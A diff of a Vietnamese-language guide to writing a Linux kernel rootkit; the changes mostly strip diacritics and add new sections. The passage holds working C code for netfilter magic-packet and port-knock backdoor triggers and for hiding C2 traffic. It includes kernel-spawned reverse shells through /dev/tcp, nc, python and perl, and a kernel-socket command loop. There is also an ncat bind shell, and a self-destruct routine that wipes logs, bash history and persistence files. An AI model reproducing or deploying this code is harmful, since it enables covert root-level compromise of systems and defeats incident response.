+  │ headroom│  [Ethernet][IP header][TCP header][Payload]   │tailroom│
+  │         │                                              │       │
+  ─────────data──────────────────────────────────────────tail────────
+
+  headroom: space de prepend headers (vd: them MAC header)
+  tailroom: space de append data
+
+  Cach access headers:
+  ─────────────────────────────────────────────────────────────────
+  struct ethhdr  *eth = eth_hdr(skb);     // skb->head + skb->mac_header
+  struct iphdr   *ip  = ip_hdr(skb);      // skb->head + skb->network_header
+  struct tcphdr  *tcp = tcp_hdr(skb);     // skb->head + skb->transport_header
+  struct udphdr  *udp = udp_hdr(skb);     // tuong tu
+  struct icmphdr *icmp = icmp_hdr(skb);   // tuong tu
+
+  Rootkit thuong:
+    ip_hdr(skb)->saddr   — lay source IP
+    ip_hdr(skb)->daddr   — lay destination IP
+    ip_hdr(skb)->protocol — IPPROTO_TCP/UDP/ICMP
+    tcp_hdr(skb)->dest   — destination port (network byte order!)
+    ntohs(tcp_hdr(skb)->dest) — convert sang host byte order
+```
+
+#### 8.0.4 NF_STOLEN Semantics — Hieu ro de tranh memory leak
+
+```
+  NF_ACCEPT:                         NF_STOLEN:
+  ───────────                        ──────────
+  Hook return NF_ACCEPT              Hook return NF_STOLEN
+       │                                  │
+       ▼                                  ▼
+  Netfilter tiep tuc                 Netfilter DUNG XU LY
+  xu ly packet qua                   KHONG free skb
+  cac hooks tiep theo                KHONG gui tiep
+       │                                  │
+       ▼                                  ▼
+  Packet den application             Rootkit SO HUU skb
+  (hoac forward)                     PHAI tu goi kfree_skb(skb)
+                                     hoac se MEMORY LEAK
+                                     
+                                     Packet:
+                                     ✗ KHONG toi application
+                                     ✗ KHONG co trong tcpdump
+                                       (neu capture SAU hook point)
+                                     ✗ KHONG generate reply
+                                     ✗ KHONG qua remaining hooks
+                                     → HOAN TOAN INVISIBLE
+
+  CANH BAO: Trong thuc te, netfilter >= 4.13 co the tu handle
+  kfree_skb khi NF_STOLEN trong mot so truong hop, nhung rootkit
+  nen goi kfree_skb(skb) explicitly de dam bao khong leak.
+```
+
+#### 8.0.5 call_usermodehelper() — Spawn userspace process tu kernel
+
+```
+  call_usermodehelper(path, argv, envp, wait)
+
+  ┌─────────────────────────────────────────────────────────────┐
+  │ Kernel Context                                               │
+  │                                                              │
+  │ 1. Allocate subprocess_info struct                          │
+  │ 2. Queue work tren khelper_wq (workqueue)                   │
+  │    │                                                         │
+  │    ▼                                                         │
+  │ 3. Worker thread (kthreadd's child) pick up work            │
+  │ 4. kernel_thread() → fork kernel thread                     │
+  │ 5. New kernel thread goi kernel_execve(path, argv, envp)    │
+  │    │  → chuyen tu kernel space sang user space               │
+  │    │  → load ELF binary                                      │
+  │    │  → setup user stack, registers                           │
+  │    │  → process chay voi uid=0, full capabilities            │
+  │    ▼                                                         │
+  │ 6. Userspace process chay (vd: /bin/bash -c "...")           │
+  │                                                              │
+  │ Wait flags:                                                  │
+  │   UMH_NO_WAIT   — return ngay, khong doi process            │
+  │   UMH_WAIT_EXEC — doi den khi exec hoan thanh (nhung ko doi │
+  │                    process exit)                              │
+  │   UMH_WAIT_PROC — doi den khi process EXIT (blocking!)      │
+  │                    NGUY HIEM neu process chay mai (reverse   │
+  │                    shell) → kernel thread block vinh vien     │
+  └─────────────────────────────────────────────────────────────┘
+
+  OPSEC issue: Process spawned boi call_usermodehelper co:
+  ─────────────────────────────────────────────────────────
+  - PPID = 2 (kthreadd) → BAT THUONG
+    (process binh thuong co PPID la shell hoac init)
+  - Forensics: ps auxf thay /bin/bash voi parent kthreadd
+  - Detection: kiem tra /proc/PID/status → PPid: 2
+  - Mitigation: rootkit an process qua DKOM hoac getdents hook
+```
+
+**Tham khao source:** `net/core/dev.c` (netif_receive_skb), `net/ipv4/ip_input.c` (ip_rcv), `net/ipv4/netfilter/` (netfilter hooks), `include/linux/skbuff.h` (sk_buff), `include/linux/netfilter.h` (hook ops), `kernel/umh.c` (call_usermodehelper)
+
+---
+
 ```c
-/* netfilter.c — Network hiding và covert communication
+/* netfilter.c — Network hiding va covert communication
  *
- * Netfilter = Linux kernel framework xử lý packets tại các
+ * Netfilter = Linux kernel framework xu ly packets tai cac
  * hook points trong network stack.
  *
  * Hook points (NF_INET_*):
@@ -3699,15 +5822,15 @@ void rk_vfs_hook_remove(void)
  *   │   App → LOCAL_OUT → [routing] → POST_ROUTING → NIC│
  *   └──────────────────────────────────────────────────┘
  *
- *   PRE_ROUTING:  packet vừa arrive, trước routing decision
+ *   PRE_ROUTING:  packet vua arrive, truoc routing decision
  *   LOCAL_IN:     packet destined cho local machine
- *   FORWARD:      packet được forward (router mode)
+ *   FORWARD:      packet duoc forward (router mode)
  *   LOCAL_OUT:    locally-generated packet
- *   POST_ROUTING: packet chuẩn bị leave
+ *   POST_ROUTING: packet chuan bi leave
  *
- * Rootkit hook PRE_ROUTING hoặc LOCAL_IN để:
+ * Rootkit hook PRE_ROUTING hoac LOCAL_IN de:
  *   1. Detect magic packets (trigger backdoor)
- *   2. Hide C2 traffic (NF_STOLEN — "ăn" packet)
+ *   2. Hide C2 traffic (NF_STOLEN — "an" packet)
  *   3. Port knocking (SYN sequence detection)
  *   4. Covert channel (data in ICMP, DNS, TCP options)
  */
@@ -3726,18 +5849,18 @@ void rk_vfs_hook_remove(void)
 /* ══════════════════════════════════════════════════════════════
  * MAGIC PACKET TRIGGER
  *
- * Passive backdoor — rootkit KHÔNG beacon, đợi magic packet.
- * Pattern từ BPFDoor (APT):
- *   1. Attacker gửi specially crafted packet
+ * Passive backdoor — rootkit KHONG beacon, doi magic packet.
+ * Pattern tu BPFDoor (APT):
+ *   1. Attacker gui specially crafted packet
  *   2. Rootkit detect magic bytes trong packet
  *   3. Rootkit activate — open reverse shell / execute command
  *
- * Packet KHÔNG đi tới application layer (NF_STOLEN) → invisible
- * cho netstat, tcpdump (nếu capture SAU netfilter hook).
+ * Packet KHONG di toi application layer (NF_STOLEN) → invisible
+ * cho netstat, tcpdump (neu capture SAU netfilter hook).
  *
  * Magic packet format (custom):
- *   ICMP Echo Request với payload bắt đầu bằng magic bytes.
- *   ICMP vì: firewall thường cho qua ICMP, looks like ping.
+ *   ICMP Echo Request voi payload bat dau bang magic bytes.
+ *   ICMP vi: firewall thuong cho qua ICMP, looks like ping.
  * ══════════════════════════════════════════════════════════════ */
 
 #define MAGIC_VALUE    0xDEAD1337  /* 4 bytes magic identifier */
@@ -3765,16 +5888,16 @@ struct magic_packet {
 /* ══════════════════════════════════════════════════════════════
  * PORT KNOCKING
  *
- * Sequence detection: attacker gửi SYN packets tới ports
- * theo đúng thứ tự → rootkit activate.
+ * Sequence detection: attacker gui SYN packets toi ports
+ * theo dung thu tu → rootkit activate.
  *
- * Ví dụ sequence: SYN→1234, SYN→5678, SYN→9012
- * Đúng thứ tự = unlock. Sai thứ tự = reset.
+ * Vi du sequence: SYN→1234, SYN→5678, SYN→9012
+ * Dung thu tu = unlock. Sai thu tu = reset.
  *
- * Ưu điểm so với magic packet:
- *   - SYN packets giống port scan → ít suspicious
- *   - Không cần crafted payload
- *   - Firewall thấy dropped SYNs (closed ports) → normal
+ * Uu diem so voi magic packet:
+ *   - SYN packets giong port scan → it suspicious
+ *   - Khong can crafted payload
+ *   - Firewall thay dropped SYNs (closed ports) → normal
  * ══════════════════════════════════════════════════════════════ */
 
 #define KNOCK_SEQUENCE_LEN 3
@@ -3783,8 +5906,8 @@ static const u16 knock_sequence[KNOCK_SEQUENCE_LEN] = {
 };
 
 struct knock_state {
-    __be32 src_ip;           /* Source IP đang knock */
-    int    current_step;     /* Step hiện tại trong sequence */
+    __be32 src_ip;           /* Source IP dang knock */
+    int    current_step;     /* Step hien tai trong sequence */
     unsigned long timestamp; /* Timeout tracking */
 };
 
@@ -3806,14 +5929,14 @@ static struct knock_state *alloc_knock_state(__be32 src_ip)
 {
     int i;
 
-    /* Tìm slot trống hoặc expired */
+    /* Tim slot trong hoac expired */
     for (i = 0; i < MAX_KNOCK_STATES; i++) {
         if (knock_states[i].src_ip == 0 ||
             time_after(jiffies,
                        knock_states[i].timestamp + 30 * HZ)) {
-            /* time_after(a, b): true nếu a sau b.
+            /* time_after(a, b): true neu a sau b.
              * 30 * HZ = 30 seconds timeout.
-             * HZ = ticks per second (thường 250 hoặc 1000). */
+             * HZ = ticks per second (thuong 250 hoac 1000). */
             knock_states[i].src_ip = src_ip;
             knock_states[i].current_step = 0;
             knock_states[i].timestamp = jiffies;
@@ -3894,19 +6017,19 @@ static unsigned int nf_hook_handler(void *priv,
     if (!skb)
         return NF_ACCEPT;
 
-    /* Lấy IP header.
+    /* Lay IP header.
      *
-     * sk_buff = socket buffer — chứa packet data + metadata.
-     * ip_hdr(skb): macro trả về pointer tới IP header trong skb. */
+     * sk_buff = socket buffer — chua packet data + metadata.
+     * ip_hdr(skb): macro tra ve pointer toi IP header trong skb. */
     ip_header = ip_hdr(skb);
 
     /* ──── ICMP Magic Packet Detection ──── */
     if (ip_header->protocol == IPPROTO_ICMP) {
         icmp_header = icmp_hdr(skb);
 
-        /* Chỉ xử lý Echo Request (type 8) — looks like ping */
+        /* Chi xu ly Echo Request (type 8) — looks like ping */
         if (icmp_header->type == ICMP_ECHO) {
-            /* Payload bắt đầu SAU ICMP header */
+            /* Payload bat dau SAU ICMP header */
             data = (unsigned char *)icmp_header + sizeof(struct icmphdr);
             data_len = ntohs(ip_header->tot_len)
                      - (ip_header->ihl * 4)
@@ -3919,7 +6042,7 @@ static unsigned int nf_hook_handler(void *priv,
                     strncmp(mp->password, MAGIC_PASS,
                             strlen(MAGIC_PASS)) == 0) {
 
-                    /* Magic packet nhận diện!
+                    /* Magic packet nhan dien!
                      * Dispatch theo cmd_type */
                     pr_info("rk: magic packet from %pI4, cmd=%d\n",
                             &ip_header->saddr, mp->cmd_type);
@@ -3939,16 +6062,16 @@ static unsigned int nf_hook_handler(void *priv,
                         break;
                     }
 
-                    /* NF_STOLEN: kernel "quên" packet này.
+                    /* NF_STOLEN: kernel "quen" packet nay.
                      *
-                     * Packet KHÔNG:
-                     *   - Đi vào userspace application
-                     *   - Xuất hiện trong tcpdump (nếu capture SAU hook)
+                     * Packet KHONG:
+                     *   - Di vao userspace application
+                     *   - Xuat hien trong tcpdump (neu capture SAU hook)
                      *   - Generate ICMP reply
-                     *   - Đi qua remaining netfilter hooks
+                     *   - Di qua remaining netfilter hooks
                      *
-                     * Caller PHẢI free skb nếu return NF_STOLEN:
-                     * kfree_skb(skb); — nhưng netfilter handles this
+                     * Caller PHAI free skb neu return NF_STOLEN:
+                     * kfree_skb(skb); — nhung netfilter handles this
                      * khi hook return NF_STOLEN. */
                     return NF_STOLEN;
                 }
@@ -3960,7 +6083,7 @@ static unsigned int nf_hook_handler(void *priv,
     if (ip_header->protocol == IPPROTO_TCP) {
         tcp_header = tcp_hdr(skb);
 
-        /* Chỉ xử lý SYN packets (connection initiation) */
+        /* Chi xu ly SYN packets (connection initiation) */
         if (tcp_header->syn && !tcp_header->ack) {
             u16 dest_port = ntohs(tcp_header->dest);
 
@@ -3970,18 +6093,18 @@ static unsigned int nf_hook_handler(void *priv,
             }
         }
 
-        /* ──── Hide traffic trên HIDDEN_PORT ──── */
+        /* ──── Hide traffic tren HIDDEN_PORT ──── */
         if (ntohs(tcp_header->source) == HIDDEN_PORT ||
             ntohs(tcp_header->dest)   == HIDDEN_PORT) {
-            /* Cho packet pass nhưng mark để hide từ logging.
-             * Alternative: NF_STOLEN để completely invisible. */
+            /* Cho packet pass nhung mark de hide tu logging.
+             * Alternative: NF_STOLEN de completely invisible. */
 
             /* Trick: set skb->sk = NULL → connection tracking skip.
-             * Conntrack miss = netstat/ss không thấy connection. */
+             * Conntrack miss = netstat/ss khong thay connection. */
         }
     }
 
-    return NF_ACCEPT;  /* Cho tất cả traffic khác pass */
+    return NF_ACCEPT;  /* Cho tat ca traffic khac pass */
 }
 
 /* ══════════════════════════════════════════════════════════════
@@ -3992,10 +6115,10 @@ static struct nf_hook_ops nf_ops = {
     .hook     = nf_hook_handler,
     .pf       = PF_INET,            /* IPv4 */
     .hooknum  = NF_INET_PRE_ROUTING, /* Earliest hook point */
-    .priority = NF_IP_PRI_FIRST,     /* Highest priority — chạy trước mọi hook khác */
+    .priority = NF_IP_PRI_FIRST,     /* Highest priority — chay truoc moi hook khac */
 };
 
-/* Nếu cần hook IPv6: register thêm với pf = PF_INET6 */
+/* Neu can hook IPv6: register them voi pf = PF_INET6 */
 
 int rk_net_init(void)
 {
@@ -4027,17 +6150,17 @@ void rk_net_cleanup(void)
 ```c
 /* reverse_shell.c — Kernel-level reverse shell
  *
- * Khi magic packet hoặc port knock trigger, rootkit mở
- * reverse shell connection TỪ kernel space.
+ * Khi magic packet hoac port knock trigger, rootkit mo
+ * reverse shell connection TU kernel space.
  *
  * 2 approaches:
- *   A) call_usermodehelper: spawn userspace process từ kernel
- *      → Đơn giản, dùng /bin/bash. Nhưng process visible trừ khi hidden.
- *   B) Kernel socket: tạo TCP connection trong kernel, pipe I/O
- *      → Không có process mới. Nhưng phức tạp hơn nhiều.
+ *   A) call_usermodehelper: spawn userspace process tu kernel
+ *      → Don gian, dung /bin/bash. Nhung process visible tru khi hidden.
+ *   B) Kernel socket: tao TCP connection trong kernel, pipe I/O
+ *      → Khong co process moi. Nhung phuc tap hon nhieu.
  *
- * APT approach: thường dùng (A) + hide spawned process.
- * Drovorub, Reptile đều dùng call_usermodehelper pattern.
+ * APT approach: thuong dung (A) + hide spawned process.
+ * Drovorub, Reptile deu dung call_usermodehelper pattern.
  */
 
 #include "rootkit.h"
@@ -4051,37 +6174,37 @@ void rk_net_cleanup(void)
 /* ══════════════════════════════════════════════════════════════
  * METHOD A: call_usermodehelper — Spawn bash reverse shell
  *
- * call_usermodehelper() là kernel API cho phép kernel code
- * chạy một userspace program. Kernel dùng API này internally
+ * call_usermodehelper() la kernel API cho phep kernel code
+ * chay mot userspace program. Kernel dung API nay internally
  * cho hotplug events, modprobe, etc.
  *
- * Cách hoạt động:
- *   1. Kernel fork một kernel thread
+ * Cach hoat dong:
+ *   1. Kernel fork mot kernel thread
  *   2. Kernel thread exec userspace binary
- *   3. Binary chạy với full root privileges
- *   4. Kết quả trả về qua wait flags
+ *   3. Binary chay voi full root privileges
+ *   4. Ket qua tra ve qua wait flags
  *
- * Tại sao không dùng execve trực tiếp:
+ * Tai sao khong dung execve truc tiep:
  *   - execve replace current process image
- *   - Trong kernel context, "current" là kernel thread/interrupted task
- *   - Gọi execve trực tiếp từ kernel = corrupt kernel state
+ *   - Trong kernel context, "current" la kernel thread/interrupted task
+ *   - Goi execve truc tiep tu kernel = corrupt kernel state
  *   - call_usermodehelper handle fork+exec properly
  *
  * Security consideration:
- *   Process được spawn sẽ visible trong ps nếu không hidden.
- *   Rootkit nên tự add PID vào hidden list ngay sau spawn.
- *   Hoặc: ẩn qua process name matching.
+ *   Process duoc spawn se visible trong ps neu khong hidden.
+ *   Rootkit nen tu add PID vao hidden list ngay sau spawn.
+ *   Hoac: an qua process name matching.
  * ══════════════════════════════════════════════════════════════ */
 
 static void rk_spawn_reverse_shell(const char *c2_addr)
 {
     /* Parse c2_addr format: "IP:PORT"
-     * Ví dụ: "10.10.10.1:4444" */
+     * Vi du: "10.10.10.1:4444" */
     char ip[64], port[16];
     char *colon;
     char bash_cmd[512];
 
-    /* Copy vì strsep modifies string */
+    /* Copy vi strsep modifies string */
     strncpy(ip, c2_addr, sizeof(ip) - 1);
     ip[sizeof(ip) - 1] = '\0';
 
@@ -4098,14 +6221,14 @@ static void rk_spawn_reverse_shell(const char *c2_addr)
      *
      * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
      *
-     * Phân tích:
+     * Phan tich:
      *   bash -i              : interactive bash shell
-     *   >& /dev/tcp/IP/PORT  : redirect stdout+stderr tới TCP connection
-     *   0>&1                 : redirect stdin từ cùng connection
+     *   >& /dev/tcp/IP/PORT  : redirect stdout+stderr toi TCP connection
+     *   0>&1                 : redirect stdin tu cung connection
      *
-     * Kết quả: attacker nhận interactive bash shell qua TCP.
+     * Ket qua: attacker nhan interactive bash shell qua TCP.
      *
-     * Alternative commands (nếu bash -i bị block):
+     * Alternative commands (neu bash -i bi block):
      *   - /bin/sh + nc:  sh -i 2>&1 | nc IP PORT
      *   - Python:        python3 -c 'import socket,os,pty...'
      *   - Perl:          perl -e 'use Socket;...'
@@ -4120,12 +6243,12 @@ static void rk_spawn_reverse_shell(const char *c2_addr)
      *   argv[1..] = arguments
      *   envp[] = environment variables
      *
-     * UMH_WAIT_EXEC: đợi exec hoàn thành (không đợi process exit)
-     * UMH_WAIT_PROC: đợi process exit (blocking)
+     * UMH_WAIT_EXEC: doi exec hoan thanh (khong doi process exit)
+     * UMH_WAIT_PROC: doi process exit (blocking)
      * UMH_NO_WAIT:   fire-and-forget (async)
      *
-     * Dùng UMH_NO_WAIT vì shell chạy indefinitely.
-     * Nếu dùng UMH_WAIT_PROC → kernel thread block mãi mãi. */
+     * Dung UMH_NO_WAIT vi shell chay indefinitely.
+     * Neu dung UMH_WAIT_PROC → kernel thread block mai mai. */
     {
         char *argv[] = {
             "/bin/bash",
@@ -4137,7 +6260,7 @@ static void rk_spawn_reverse_shell(const char *c2_addr)
             "HOME=/tmp",
             "TERM=xterm",
             "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
-            "HISTFILE=/dev/null",   /* Không lưu bash history */
+            "HISTFILE=/dev/null",   /* Khong luu bash history */
             NULL
         };
 
@@ -4152,16 +6275,16 @@ static void rk_spawn_reverse_shell(const char *c2_addr)
 /* ══════════════════════════════════════════════════════════════
  * METHOD B: Kernel socket reverse shell (advanced)
  *
- * Tạo TCP connection TRỰC TIẾP trong kernel space.
- * Không spawn userspace process → không visible trong ps.
+ * Tao TCP connection TRUC TIEP trong kernel space.
+ * Khong spawn userspace process → khong visible trong ps.
  *
- * Chạy trong kernel thread để không block current task.
+ * Chay trong kernel thread de khong block current task.
  *
- * Giới hạn:
- *   - Kernel không có /bin/bash → command execution phức tạp
- *   - I/O phải hand-roll (recv command → execute → send output)
- *   - Dùng call_usermodehelper cho mỗi command
- *   - Hoặc implement simple command parser trong kernel
+ * Gioi han:
+ *   - Kernel khong co /bin/bash → command execution phuc tap
+ *   - I/O phai hand-roll (recv command → execute → send output)
+ *   - Dung call_usermodehelper cho moi command
+ *   - Hoac implement simple command parser trong kernel
  * ══════════════════════════════════════════════════════════════ */
 
 struct shell_config {
@@ -4171,10 +6294,10 @@ struct shell_config {
 
 static struct task_struct *shell_thread = NULL;
 
-/* ── Receive data từ kernel socket ──
+/* ── Receive data tu kernel socket ──
  *
- * kernel_recvmsg() tương tự recvmsg() syscall nhưng kernel-internal.
- * Dùng msghdr + kvec (kernel vector) thay vì iovec.
+ * kernel_recvmsg() tuong tu recvmsg() syscall nhung kernel-internal.
+ * Dung msghdr + kvec (kernel vector) thay vi iovec.
  */
 static int ksock_recv(struct socket *sock, char *buf, int len)
 {
@@ -4199,13 +6322,13 @@ static int ksock_send(struct socket *sock, const char *buf, int len)
     return kernel_sendmsg(sock, &msg, &iov, 1, len);
 }
 
-/* ── Execute command và capture output ──
+/* ── Execute command va capture output ──
  *
- * Dùng call_usermodehelper_exec() with pipes.
- * Hoặc simple approach: write output vào temp file, read back.
+ * Dung call_usermodehelper_exec() with pipes.
+ * Hoac simple approach: write output vao temp file, read back.
  *
- * Approach đây: execute command, redirect output vào /tmp file,
- * đọc file từ kernel, gửi qua socket, xóa file.
+ * Approach day: execute command, redirect output vao /tmp file,
+ * doc file tu kernel, gui qua socket, xoa file.
  */
 static int rk_exec_and_send(struct socket *sock, const char *cmd)
 {
@@ -4216,7 +6339,7 @@ static int rk_exec_and_send(struct socket *sock, const char *cmd)
     loff_t pos = 0;
     ssize_t bytes;
 
-    /* Execute command, redirect output tới temp file */
+    /* Execute command, redirect output toi temp file */
     snprintf(full_cmd, sizeof(full_cmd),
              "/bin/sh -c '%s > %s 2>&1'", cmd, output_path);
 
@@ -4226,11 +6349,11 @@ static int rk_exec_and_send(struct socket *sock, const char *cmd)
             "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
             NULL
         };
-        /* UMH_WAIT_PROC: đợi command hoàn thành để đọc output */
+        /* UMH_WAIT_PROC: doi command hoan thanh de doc output */
         call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     }
 
-    /* Đọc output file */
+    /* Doc output file */
     f = filp_open(output_path, O_RDONLY, 0);
     if (IS_ERR(f)) {
         ksock_send(sock, "exec failed\n", 12);
@@ -4250,8 +6373,8 @@ static int rk_exec_and_send(struct socket *sock, const char *cmd)
     kfree(read_buf);
     filp_close(f, NULL);
 
-    /* Xóa temp file.
-     * Dùng vfs_unlink hoặc call_usermodehelper("rm"). */
+    /* Xoa temp file.
+     * Dung vfs_unlink hoac call_usermodehelper("rm"). */
     {
         char *argv[] = { "/bin/rm", "-f", output_path, NULL };
         char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
@@ -4263,8 +6386,8 @@ static int rk_exec_and_send(struct socket *sock, const char *cmd)
 
 /* ── Kernel thread: reverse shell loop ──
  *
- * Thread chạy indefinitely:
- *   1. Connect tới C2
+ * Thread chay indefinitely:
+ *   1. Connect toi C2
  *   2. Recv command
  *   3. Execute
  *   4. Send output
@@ -4286,7 +6409,7 @@ static int reverse_shell_thread_fn(void *data)
         goto out;
     }
 
-    /* ── Connect tới C2 server ── */
+    /* ── Connect toi C2 server ── */
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = cfg->c2_ip;
@@ -4309,9 +6432,9 @@ static int reverse_shell_thread_fn(void *data)
         cmd_len = ksock_recv(sock, cmd_buf, sizeof(cmd_buf) - 1);
 
         if (cmd_len <= 0) {
-            /* Connection closed hoặc error */
+            /* Connection closed hoac error */
             if (cmd_len == -EAGAIN || cmd_len == -EWOULDBLOCK) {
-                /* No data available (non-blocking) — sleep và retry */
+                /* No data available (non-blocking) — sleep va retry */
                 msleep(100);
                 continue;
             }
@@ -4335,12 +6458,12 @@ static int reverse_shell_thread_fn(void *data)
             break;
 
         if (strcmp(cmd_buf, "root") == 0) {
-            /* Give root tới current hoặc specified process */
+            /* Give root toi current hoac specified process */
             ksock_send(sock, "use: kill -54 31337\n# ", 21);
             continue;
         }
 
-        /* Execute và send output */
+        /* Execute va send output */
         rk_exec_and_send(sock, cmd_buf);
         ksock_send(sock, "# ", 2);
     }
@@ -4388,11 +6511,11 @@ static void rk_spawn_kernel_reverse_shell(__be32 c2_ip, __be16 c2_port)
 ### 8.3 Command Execution — rk_execute_command
 
 ```c
-/* command_exec.c — Execute arbitrary commands từ kernel
+/* command_exec.c — Execute arbitrary commands tu kernel
  *
- * Nhận command string từ magic packet, execute trong userspace.
- * Output KHÔNG gửi ngược → "fire and forget".
- * Cho execute-and-exfil, dùng reverse shell.
+ * Nhan command string tu magic packet, execute trong userspace.
+ * Output KHONG gui nguoc → "fire and forget".
+ * Cho execute-and-exfil, dung reverse shell.
  */
 
 #include "rootkit.h"
@@ -4408,23 +6531,23 @@ static void rk_execute_command(const char *cmd)
         NULL
     };
 
-    /* UMH_NO_WAIT: async execution — không block kernel.
+    /* UMH_NO_WAIT: async execution — khong block kernel.
      *
      * Internally call_usermodehelper:
      *   1. Allocate subprocess_info struct
-     *   2. Queue work trên khelper workqueue
+     *   2. Queue work tren khelper workqueue
      *   3. Worker thread fork+exec /bin/sh
-     *   4. /bin/sh chạy command
+     *   4. /bin/sh chay command
      *   5. Return code discarded (UMH_NO_WAIT)
      *
-     * Process chạy với uid=0, full capabilities.
-     * Spawned process CÓ THỂ visible trong ps
-     * → rootkit tự ẩn nó qua getdents64 hook
-     *   (nếu process name match hidden criteria).
+     * Process chay voi uid=0, full capabilities.
+     * Spawned process CO THE visible trong ps
+     * → rootkit tu an no qua getdents64 hook
+     *   (neu process name match hidden criteria).
      *
      * OPSEC consideration:
-     *   - /bin/sh fork có PPID = 2 (kthreadd) → unusual
-     *   - Forensics tools detect này: orphaned shell with kthreadd parent
+     *   - /bin/sh fork co PPID = 2 (kthreadd) → unusual
+     *   - Forensics tools detect nay: orphaned shell with kthreadd parent
      *   - Mitigation: re-parent process (prctl PR_SET_PDEATHSIG workaround)
      */
     int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
@@ -4438,17 +6561,17 @@ static void rk_execute_command(const char *cmd)
 ```c
 /* self_destruct.c — Clean removal of rootkit
  *
- * Khi nhận self-destruct command:
- *   1. Remove tất cả hooks
- *   2. Show module (để rmmod hoạt động)
- *   3. Delete rootkit files từ disk
+ * Khi nhan self-destruct command:
+ *   1. Remove tat ca hooks
+ *   2. Show module (de rmmod hoat dong)
+ *   3. Delete rootkit files tu disk
  *   4. Remove persistence mechanisms
  *   5. Unload module
  *
- * APT pattern: tự hủy khi phát hiện forensics tool,
- * hoặc khi mission complete (data exfiltrated).
+ * APT pattern: tu huy khi phat hien forensics tool,
+ * hoac khi mission complete (data exfiltrated).
  *
- * Mục đích: không để lại traces cho incident response team.
+ * Muc dich: khong de lai traces cho incident response team.
  */
 
 #include "rootkit.h"
@@ -4458,26 +6581,26 @@ static void rk_self_destruct(void)
 {
     pr_info("rk: self-destruct initiated\n");
 
-    /* Step 1: Remove hooks TRƯỚC khi unload.
-     * Nếu unload mà hooks vẫn active → crash. */
+    /* Step 1: Remove hooks TRUOC khi unload.
+     * Neu unload ma hooks van active → crash. */
     rk_remove_hooks();
     rk_vfs_hook_remove();
     rk_net_cleanup();
 
-    /* Step 2: Show module (re-insert vào module list).
-     * rmmod cần module trong list để find và unload. */
+    /* Step 2: Show module (re-insert vao module list).
+     * rmmod can module trong list de find va unload. */
     rk_show_module();
 
-    /* Step 3: Delete rootkit files từ disk.
+    /* Step 3: Delete rootkit files tu disk.
      *
-     * Xóa:
+     * Xoa:
      *   - Module .ko file
      *   - Config files
      *   - Persistence entries
      *   - Temp files
      *
-     * Dùng call_usermodehelper vì kernel vfs_unlink
-     * cần dentry resolution → phức tạp hơn.
+     * Dung call_usermodehelper vi kernel vfs_unlink
+     * can dentry resolution → phuc tap hon.
      */
     {
         char *cleanup_script =
@@ -4487,16 +6610,16 @@ static void rk_self_destruct(void)
             "rm -f /var/tmp/.rk_* 2>/dev/null; "
             "depmod -a 2>/dev/null; "
             "sed -i '/^rk$/d' /etc/modules 2>/dev/null; "
-            /* Remove systemd service nếu có */
+            /* Remove systemd service neu co */
             "systemctl disable rk.service 2>/dev/null; "
             "rm -f /etc/systemd/system/rk.service 2>/dev/null; "
-            /* Remove udev rule nếu có */
+            /* Remove udev rule neu co */
             "rm -f /etc/udev/rules.d/99-rk.rules 2>/dev/null; "
-            /* Xóa command history liên quan */
+            /* Xoa command history lien quan */
             "sed -i '/insmod.*rk/d' /root/.bash_history 2>/dev/null; "
-            /* Clear dmesg (xóa kernel log của rootkit) */
+            /* Clear dmesg (xoa kernel log cua rootkit) */
             "dmesg -C 2>/dev/null; "
-            /* Cuối cùng: rmmod chính module này */
+            /* Cuoi cung: rmmod chinh module nay */
             "rmmod rk 2>/dev/null";
 
         char *argv[] = { "/bin/sh", "-c", cleanup_script, NULL };
@@ -4505,9 +6628,9 @@ static void rk_self_destruct(void)
             NULL
         };
 
-        /* UMH_NO_WAIT vì rmmod sẽ trigger module exit.
-         * Nếu UMH_WAIT_PROC → deadlock (đợi rmmod xong
-         * nhưng rmmod cần chạy exit code mà ta đang trong). */
+        /* UMH_NO_WAIT vi rmmod se trigger module exit.
+         * Neu UMH_WAIT_PROC → deadlock (doi rmmod xong
+         * nhung rmmod can chay exit code ma ta dang trong). */
         call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     }
 }
@@ -4516,19 +6639,19 @@ static void rk_self_destruct(void)
 ### 8.5 Backdoor Activation — rk_activate_backdoor
 
 ```c
-/* backdoor.c — Activate backdoor sau port knock hoặc magic packet
+/* backdoor.c — Activate backdoor sau port knock hoac magic packet
  *
- * Bind shell: mở listening port trên target machine.
- * Attacker connect tới port → nhận shell.
+ * Bind shell: mo listening port tren target machine.
+ * Attacker connect toi port → nhan shell.
  *
- * Khác reverse shell:
- *   Reverse shell: target connect OUT tới C2
+ * Khac reverse shell:
+ *   Reverse shell: target connect OUT toi C2
  *   Bind shell:    target LISTEN, C2 connect IN
  *
  * Bind shell useful khi:
- *   - Target có outbound firewall (block reverse connections)
- *   - Attacker đã có inbound access (same network, VPN)
- *   - Port knock mở bind shell chỉ khi cần
+ *   - Target co outbound firewall (block reverse connections)
+ *   - Attacker da co inbound access (same network, VPN)
+ *   - Port knock mo bind shell chi khi can
  */
 
 #include "rootkit.h"
@@ -4553,9 +6676,9 @@ static void rk_activate_backdoor_simple(__be32 authorized_ip)
      *   -p PORT: listen port
      *   -e /bin/bash: execute bash on connection
      *
-     * Fallback: socat, python, perl nếu ncat không available.
+     * Fallback: socat, python, perl neu ncat khong available.
      *
-     * Multiple attempts với khác nhau tools tăng success rate.
+     * Multiple attempts voi khac nhau tools tang success rate.
      */
     char cmd[512];
 
@@ -4586,7 +6709,7 @@ static void rk_activate_backdoor_simple(__be32 authorized_ip)
  *
  * Advanced: bind TCP socket trong kernel, accept connections,
  * pipe commands qua rk_exec_and_send.
- * Không tạo userspace process cho listener.
+ * Khong tao userspace process cho listener.
  */
 static int backdoor_thread_fn(void *data)
 {
@@ -4600,7 +6723,7 @@ static int backdoor_thread_fn(void *data)
                             IPPROTO_TCP, &listen_sock);
     if (ret < 0) goto out;
 
-    /* Set SO_REUSEADDR — cho phép bind lại port sau close */
+    /* Set SO_REUSEADDR — cho phep bind lai port sau close */
